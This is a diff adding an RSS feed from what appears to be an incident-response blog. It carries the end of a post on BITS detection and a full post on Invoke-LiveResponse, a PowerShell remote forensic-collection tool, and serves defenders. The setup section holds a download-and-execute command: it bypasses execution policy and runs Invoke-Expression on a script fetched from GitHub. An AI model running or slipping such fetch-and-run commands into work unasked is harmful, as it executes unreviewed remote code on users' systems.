+  &lt;li&gt;Process command line visibility on the endpoints to spot evil process chains and unusual command lines or obfuscation that is abnormal for the environment.&lt;/li&gt;
+  &lt;li&gt;Process module load visibility to spot unexpected functionality loaded.&lt;/li&gt;
+  &lt;li&gt;Process network activity to unexpected locations is also a good method to increase the scope of detection on the endpoint and provide additional context to network detections that may have visibility limitations.&lt;/li&gt;
+  &lt;li&gt;Spotting disk or registry write events out of normal activity and having context of associated process. Why is svchost.exe writing evil.exe to c:\Windows\VSS?&lt;/li&gt;
+  &lt;li&gt;Ability to execute adlib collections to answer questions of the environment.&lt;/li&gt;
+  &lt;li&gt;Upgrading to Powershell version 5 for Powershell script block visibility.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I hope this post has provided some good food for thought and pointed anyone interested in the direction for further research and reference material. Feel free to reach out if you have any questions.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;p&gt;1) ANSSI. &lt;a href=&quot;https://github.com/ANSSI-FR/bits_parser&quot;&gt;Bits_Parser&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;2) Azouri, Dor. &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/Dor%20Azouri/DEFCON-25-Dor-Azouri-BITSInject-WP.pdf&quot;&gt;BITSInject&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;3) Bohannon, Daniel. &lt;a href=&quot;https://github.com/danielbohannon/Invoke-CradleCrafter&quot;&gt;Invoke-CradleCrafter&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;4) Geiger,Matthew. &lt;a href=&quot;https://www.dfrws.org/sites/default/files/session-files/pres-finding_your_naughty_bits.pdf&quot;&gt;Finding Your Naughty BITS&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;5) Hexacorn. &lt;a href=&quot;http://www.hexacorn.com/blog/2017/07/12/beyond-good-ol-run-key-part-64/&quot;&gt;Beyond Good Old RUn Key part 64&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;6) Microsoft. &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753856(v=ws.11)&quot;&gt;Bitsadmin documentation&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;7) Microsoft. &lt;a href=&quot;https://github.com/MicrosoftDocs/windows-powershell-docs/tree/master/docset/windows/bitstransfer&quot;&gt;Powershell Bitstransfer documentation&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;8) Microsoft. &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ee663885(v=vs.85).aspx&quot;&gt;Using Windows Powershell to create BITS Jobs&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;9) O’Day, Dan. &lt;a href=&quot;https://github.com/danzek/annotationis/blob/master/Operating%20Systems/Windows/BITS.md&quot;&gt;BITS annotationis&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;10) Secureworks, Counter Threat Unit. &lt;a href=&quot;https://www.secureworks.com/blog/malware-lingers-with-bits&quot;&gt;Malware Lingers with BITS&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 18 Feb 2018 00:00:00 +1100</pubDate>
+        <link>https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html</link>
+        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html</guid>
+        
+        <category>DFIR</category>
+        
+        <category>BTIS</category>
+        
+        <category>Powershell</category>
+        
+        <category>LiveResponse</category>
+        
+        <category>IR</category>
+        
+        
+        <category>posts</category>
+        
+      </item>
+    
+      <item>
+        <title>Invoke-LiveResponse</title>
+        <description>&lt;p&gt;In this post, I am going to talk about a Powershell module I have authored as a simple 
+implementation for live response and file collections over Powershell remoting. The initial use case was considered after an endpoint vendor appliance failed and capability for raw collections was limited. The module uses Powerforensics over WinRM, and after some interest, I think is worth sharing.&lt;/p&gt;
+
+&lt;p&gt;Some of the areas I will cover are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Background.&lt;/li&gt;
+  &lt;li&gt;Requirements and setup.&lt;/li&gt;
+  &lt;li&gt;Module switches and configuration.&lt;/li&gt;
+  &lt;li&gt;Performance tweaks.&lt;/li&gt;
+  &lt;li&gt;Forensic Footprint over WinRM.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The goal of this project was to promote Powershell as a blue team tool and improve my Powershell knowledge with research.&lt;/p&gt;
+
+&lt;p&gt;Github: &lt;a href=&quot;https://github.com/mgreen27/Powershell-IR&quot;&gt;https://github.com/mgreen27/Powershell-IR&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Get-Help&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Invoke-LiveResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-detailed&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+&lt;p&gt;The ability to collect live response data from a remote system is a fundamental requirement for modern incident response. Rouge processes, code injection, suspicious network activity or other disk and memory artefacts are some of data points an analyst may look for signs of evil. The ability to collect these data points quickly, enables informed decisions and reduces risk of loss from an incident. Some of the difficulties in accessing these artefacts include lack of endpoint visibility or capabilities for ad-lib collection, from either a technical or business limitation.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/02powerforensics.png&quot; /&gt;&lt;/div&gt;
+
+&lt;p&gt;PowerForensics is a disk forensic framework for Powershell written in C# by Jared Atkinson. Typical use case is local analysis from a traditional collection enabling the analyst to perform detailed disk forensics similar to the more well known Sleuth Kit. Powerforensics can also be used for similar tasks over Powershell remoting.&lt;/p&gt;
+
+&lt;p&gt;In offensive security, one of the biggest enablers in Powershell is the capability to reflectively load PE files, shellcode and assembly into memory. That means security tools can be loaded from a Powershell script, in some cases never touching disk. The same techniques can be used by the Blue Team and quite a few practitioners are starting to use this feature for things like memory and volatile data forensics. Powerforensics enables the capability for remote raw disk analysis using Assembly.Load Method.&lt;/p&gt;
+
+&lt;p&gt;Invoke-LiveResponse is the result of converting some scripts for raw collection with redirected acquisition and live response into an easy to use tool. During use, I have tweaked some performance and learnt a lot in implementation about both Powershell and Powerforensics.&lt;/p&gt;
+
+&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Powershell 4.0 or above collector machine (3 should also be functional).&lt;/li&gt;
+  &lt;li&gt;Powershell 2.0 or above target machine/s.&lt;/li&gt;
+  &lt;li&gt;Powerforensics installed in running user Powershell Modules path (I have included automatic installation below).&lt;/li&gt;
+  &lt;li&gt;WinRM setup with Kerberos and/or Negotiation authentication.&lt;/li&gt;
+  &lt;li&gt;SMB Network share with write access (for file collections).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
+&lt;p&gt;On a Powershell 4+ collector machine, assuming you trust me, run the following proxy aware powershell commands to download then install. The install places both Powerforensics and Invoke-LiveResponse into the running users profile.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Proxy aware download install of Invoke-LiveResponse and Powerforensics&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Set-Executionpolicy&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-ExecutionPolicy&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bypass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-force&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;https://raw.githubusercontent.com/mgreen27/Powershell-IR/master/Get-Forensicating.ps1&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;New-Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;[System.Net.WebRequest]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetSystemWebProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Credentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;[System.Net.CredentialCache]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DefaultNetworkCredentials&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Invoke-Expression&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DownloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Once installed run to load&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Import-Module&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Invoke-LiveResponse&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;winrm&quot;&gt;WinRM&lt;/h2&gt;
+&lt;p&gt;I recommend setting WinRM up via Group policy for simplified deployment across all Powershell versions. Please see the resource section for some good resources and a detailed walkthrough, including a previous post of mine in setting up a lab.&lt;/p&gt;
+
+&lt;p&gt;For a quick and dirty install, Invoke-StartWinRM will turn on PSRemoting and configure appropriate credential configurations on Powershell 3 machines and above. Similarly, Invoke-StopWinRM may also be used to revert changes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/03invoke-startwinrm.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;credential-risk&quot;&gt;Credential Risk&lt;/h2&gt;
+&lt;p&gt;To minimise credential risk, CredSSP (and any basic) authentication over WinRM should always be disabled. This results in a network logon type 3 and protected credentials of the account running WinRM. The drawbacks here means our SMB share for copy use cases requires unauthenticated write access or credentials passed into the script at runtime. As share credentials will be pushed to the endpoint, best practice would be to create temporary account/access to our share for the duration of our redirected file acquisition.&lt;/p&gt;
+
+&lt;h2 id=&quot;memory&quot;&gt;Memory&lt;/h2&gt;
+&lt;p&gt;Powershell has a configuration option to restrict the amount of memory available in a shell. This value is called MaxMemoryPerShellMB, and depending on Powershell version may be set in both Shell and Plugin WSMan configurations. In Powershell 2.0, the default is 150MB, which will likely need to be increased or turned off. As later versions of Powershell have been released, the default values have risen appropriately for most WinRM use, for example in 3.0 MaxMemoryPerShellMB = 1024, which is multiples above required memory.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# To view this setting locally&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Get-Item&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WSMan&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MaxMemoryPerShellMB&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Get-Item&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WSMan&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Plugin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Quotas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MaxMemoryPerShellMB&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# To edit this setting locally&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Set-Item&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WSMan&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MaxMemoryPerShellMB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Value&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Force&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;Set-Item&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WSMan&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Plugin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Quotas&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MaxMemoryPerShellMB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Value&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Force&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The simplest approach is to deploy WinRM via Group policy and configure these settings via GPO or logon script. For manual intervention, Invoke-MaxMemory will connect via WinRM and turn off this setting (set to 0). Powershell 2.0 has restrictions in remotely changing WinRM settings, although not ideal from a forensic standpoint, the “–Legacy” switch uses scheduled tasks to force a local configuration change.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/05Maxmemory.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;invoke-liveresponse&quot;&gt;Invoke-LiveResponse&lt;/h1&gt;
+&lt;p&gt;The current scope of Invoke-LiveResponse is a live response tool for targeted collection. There are two main modes of use in Invoke-LiveResponse and both are configured by a variety of command line switches.&lt;/p&gt;
+
+&lt;h2 id=&quot;forensiccopy&quot;&gt;ForensicCopy&lt;/h2&gt;
+&lt;p&gt;Configured by simple command line switches, Invoke-LiveResponse enables file collection from a remote machine over WinRM.
+- Reflectively loads Powerforensics onto target machine to enable raw disk access.
+- Leverages a scriptblock for each configured function of the script. 
+- Common forensic artefacts and custom file collections.
+- Depending on the selected switches, each selected capability is joined at run time to build the scriptblock pushed out to the target machine. &lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Invoke-LiveResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-ComputerName&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WinRMtester&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;\&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;-all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Map&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Drive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-UNC&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;\\&amp;lt;Server&amp;gt;\&amp;lt;folder&amp;gt; /user:&amp;lt;optional share credentials&amp;gt;&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Some of the available configuration options:
+&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/07parameters1.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Some of the switches available in ForensicCopy mode:
+&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/08parameters2.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;live-response&quot;&gt;Live Response&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Inspired by the Kansa Framework, LiveResponse mode will execute any Powershell scripts placed inside a content folder.&lt;/li&gt;
+  &lt;li&gt;Results consist of the standard out from the executed content, redirected from the collection machine to a local Results folder as ScriptName.txt.&lt;/li&gt;
+  &lt;li&gt;The benefit of this method is the ability to operationalise new capability easily by dropping in new content with desired StdOut.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Invoke-LiveResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-ComputerName&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WinRMtester&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;\&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; 
+			&lt;span class=&quot;n&quot;&gt;-LR&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;-Results&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cases&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/09LiveResponse.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Some of the additional switches available in LiveResponse and shell mode:
+&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/10parameters3.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;performance-tweaks&quot;&gt;Performance Tweaks&lt;/h1&gt;
+&lt;p&gt;Testing for Invoke-LiveResponse has primarily been on Windows 7 and 8.1, with some minor testing on Windows 10 and Server Operating systems. I have also tested on Powershell 2.0 to 5.0 target machines. The decision was made to use Powerforensics to enable raw collection and bypass the need to drop or run binaries as much as possible&lt;/p&gt;
+
+&lt;p&gt;Powerforensics is the best Powershell based forensics framework available, but has not been primarily designed for remote raw collections. With that in mind, during testing I discovered an issue in Powerforensics Copy command-lets around memory utilisation and limitation of file size. The limitation is around 2.1GB (Int32 max bytes) and caused by the way Powerforensics builds a byte array for the complete file stream prior to copying. The limitation also means that memory consumption for my use cases (large system files) spiked up to at least the size of the file.&lt;/p&gt;
+
+&lt;p&gt;Normally this would be a game killer for using Powerforensics in this way. However, one of its best features is the ability to use an API and collect data at the appropriate level for your needs. In this case, I was able to leverage the Powerforensics API to collect files of interest in smaller chunks. The public method used is called ForensicDD and I am doing some traditional volume boot record calculations to enable a low memory footprint. File size limitations are also removed as the byte stream size has been significantly reduced.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/11forensicdd.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
+
+&lt;p&gt;Its also worthy to note, the capability to copy alternate data streams besides hard coded special files is not exposed to the user. The ForensicCopy function will simply copy resident bytes or the DATA stream for a normal Raw file copy.&lt;/p&gt;
+
+&lt;p&gt;Another performance tweak was with UsnJournal:$J to limit the collection to non-sparse data. This differs from most forensic collection tools that acquire all $J data and results in a bloated collection including redundant zeros. This method did hit a snag for an edgecase on a 2012R2 server where Powerforensics failed to parse the MFT entry as expected for the UsnJournal. This case is currently under review however I decided to implement a fall back collection via fsutil if required.&lt;/p&gt;
+
+&lt;p&gt;In any case I would recommend tool validation of this collection compared to current tools. In my testing I was able to validate file size and entries with another tool with a similar approach finding sample journal entries as expected.&lt;/p&gt;
+
+&lt;p&gt;Finally, for user experience, I also decided to implement CPU prioritisation to run my collection on idle CPU cycles only.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/12idlecpu.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;forensic-footprint&quot;&gt;Forensic Footprint&lt;/h1&gt;
+&lt;p&gt;The most important factor for forensic footprint should be to know and validate your tools. To respect the order of volatility I have moved Live Response mode to run first to minimise impact by ForensicCopy mode. I would also recommend a naming scheme of Live Response content to further respect order of volatility.&lt;/p&gt;
+
+&lt;p&gt;There has been significant research to optimise target memory performance to be as low as possible. As primarily running in memory, the visible disk footprint of Powershell remoting is relatively small during a PSSession. With default logging, only expected authentication events and very basic WinRM and Powershell logs are generated. Wsmprovhost.exe is spawned on the target machine when running Invoke-LiveResponse and target disk activity is minimised with a remote share transfer. Depending on the collection, Net.exe and any other binaries called in script content may also be spawned from wsmprovhost.exe for their relevant functions.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/13Process.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;During the collection we see the expected authentication IDs 4624 and 4672 to access the target machine. When in ForensicCopy mode, if enabled we also see Event ID 4648 - explicit logon resulting from the collection copy to remote share.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/14_4648.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
+
+&lt;p&gt;In Powershell 5+ environments the capability to enable Powershell scriptblock logging highlights the benefit of visibility with Event ID 4104. Over multiple events we can see the Powerforensics functions being pushed to the target machine, decompressed and loaded to memory with the Add-PowerForensicsType function. We can also see the script block itself in the log. For a complete version, I have included a copy of the raw transaction logs &lt;a href=&quot;https://github.com/mgreen27/mgreen27.github.io/tree/master/other/Invoke-LiveResponse/Powershell%20Transcript&quot;&gt;here&lt;/a&gt; for review.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/15_4104.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally Event ID 4103 – Module logging records pipeline execution details as seen in the example below. Module logging has been available since Powershell 3+ and although not as verbose as 4104, collected context about the commands run inside my script block. Below you can see datastream preparation for an $MFT raw copy. Host application as “wsmprovhost.exe -Embedding” indicates a PSSession generated event.&lt;/p&gt;
+
+&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/assets/article_images/2018-01-14-Invoke-LiveResponse/16_4103.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;future-development-ideas&quot;&gt;Future development ideas&lt;/h1&gt;
+&lt;p&gt;Invoke-LiveResponse has currently been limited scope. Some ideas for additional features are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Add memory collection capability to ForensicCopy mode for less reliance on LiveResponse scripts (and make appropriate order of volatility changes).&lt;/li&gt;
+  &lt;li&gt;Expand scope to enable more scale through Powershell Start-Job capabilities.&lt;/li&gt;
+  &lt;li&gt;Larger artefact coverage in ForensicCopy mode.&lt;/li&gt;
+  &lt;li&gt;Automate analysis tasks.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;In this post I have walked through Invoke-LiveResponse, a Powershell module that enables raw file collections and live response over WinRM. Work still needs to be done on scale optimisations, however it provides a viable option of raw collection when other tools fail.&lt;/p&gt;
+
+&lt;p&gt;This kind of capability highlights where I believe Microsoft focused shops will be heading in the future. Although a political nightmare to setup in large environments, the Microsoft mantra of constrained endpoints, just in time administration and transparency in Powershell logging really assists opening up capability whilst minimising risk of remote administration.&lt;/p&gt;
+
+&lt;p&gt;Overall it has been a great learning experience putting together, and optimising some of the Powershell features. Im hoping others can benefit from this post as much as I have enjoyed the research and writing it. Feel free to reach out if you have any questions, find any bugs or pull requests.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;p&gt;1) Atkinson, Jared. &lt;a href=&quot;http://www.invoke-ir.com/&quot;&gt;Invoke-IR / Powerforensics&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;2) Australian Signals Directorate. &lt;a href=&quot;http://www.asd.gov.au/publications/protect/Securing_PowerShell.pdf&quot;&gt;Securing PowerShell in the Enterprise&lt;/a&gt;, 2016&lt;/p&gt;
+
+&lt;p&gt;3) Dunwoody, Matthew. &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.htm&quot;&gt;Greater Visibility Through PowerShell Logging&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;4) Forensics wiki. [New Technology File Systems (some general NTFS information)](http://www.forensicswiki.org/wiki/New_Technology_File_System_(NTFS)&lt;/p&gt;
+
